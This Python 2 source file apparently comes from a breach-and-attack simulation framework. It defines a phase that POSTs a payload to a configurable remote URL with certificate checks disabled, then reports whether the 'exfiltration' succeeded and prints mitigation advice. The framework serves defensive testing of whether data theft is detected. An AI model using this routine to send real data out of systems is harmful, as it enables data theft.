import logging
import requests
from ai_utils.phases.abstract_phase import AbstractPhaseClass
from ai_utils.scenarios.globals import NetworkUtils

class ExfiltrateOverHttpPhaseClass(AbstractPhaseClass):
    TrackerId = "166"
    Subject = "Ex-Filtrate data over http"
    Description = "Ex-Filtrate data over http"

    def __init__(self, isPhaseCritical, postUrl, payload):
        AbstractPhaseClass.__init__(self, isPhaseCritical)
        self.PostUrl = NetworkUtils.CheckUrlPrefix(postUrl)
        self.Payload = payload

    def PostData(self):
        try:
            self.PostResponceOut = requests.post(self.PostUrl, self.Payload, verify=False, allow_redirects=False)
            return self.PostResponceOut and self.PostResponceOut.status_code == 200
        except Exception, e:
            logging.exception(e)
        return False

    def Run(self):
        phaseSuccessful = self.PostData()
        if phaseSuccessful:
            self.PhaseResult['status_code'] = str(self.PostResponceOut.status_code)
            self.PhaseResult['is_redirect'] = str(self.PostResponceOut.is_redirect) if hasattr(self.PostResponceOut, 'is_redirect') else "NA"
            self.PhaseReporter.Info('Successfully ex-filtrated over http')
            self.PhaseReporter.Report('An HTTP 200 status code was returned when data was exfiltrated to a remote host using a POST HTTP Request')
            self.PhaseReporter.Mitigation('Requests to "{}" should be monitored or prevented'.format(self.PostUrl))
        else:
            self.PhaseReporter.Info('Failed to ex-filtrate over http')
        return phaseSuccessful
